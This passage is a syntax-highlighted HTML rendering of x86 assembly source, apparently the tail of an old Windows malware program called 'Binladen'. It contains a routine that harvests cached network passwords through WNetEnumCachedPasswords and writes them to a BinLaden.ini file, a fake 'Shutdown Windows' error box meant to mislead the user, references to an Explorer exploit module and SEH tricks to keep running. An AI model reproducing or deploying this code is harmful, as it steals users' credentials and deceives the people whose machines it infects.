</span><span class="sc5">InfExpRetCl</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ToolHelpHandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">InfExpRet</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad7r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO XPLOIT_EXPLORER'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">XpltXplorer</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">hide_function</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ProgError</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">windowhandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">sizevalue</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">windowtext</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">buffervalue</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">bufferdata</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CODESEG</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bufferdata</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MemError</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Error 0xFFFFF182'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Shutdown Windows'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MemError</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">windowhandle</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SubKey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AppEvents\EventLabels\AppGPFault'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SubKey</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCreateKeyA</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DefaultErro</span><span class="sc0">

</span><span class="sc5">RetrieveSTR</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sizevalue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sizevalue</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buffervalue</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">windowhandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegEnumValueA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">windowhandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc5">DefaultErro</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MB_ICONERROR</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ProgError</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">GetPass</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ErrorPass</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PassEnd</span><span class="sc0">
</span><span class="sc5">ErrorPass</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad7rw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO GETPASS'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">callback</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WNetEnumCachedPasswords</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PassEnd</span><span class="sc0">

</span><span class="sc5">callback</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BinLadenIni</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\BinLaden.ini'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BinLadenIni</span><span class="sc4">:</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenCreate</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">PassEnd</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PassEnd</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad7ra</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO GETPASS'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetPass</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">rnd_char</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Binladen</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
            </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Binladen</span><span class="sc0">
            </span><span class="sc5">end</span></div></body>
</html>
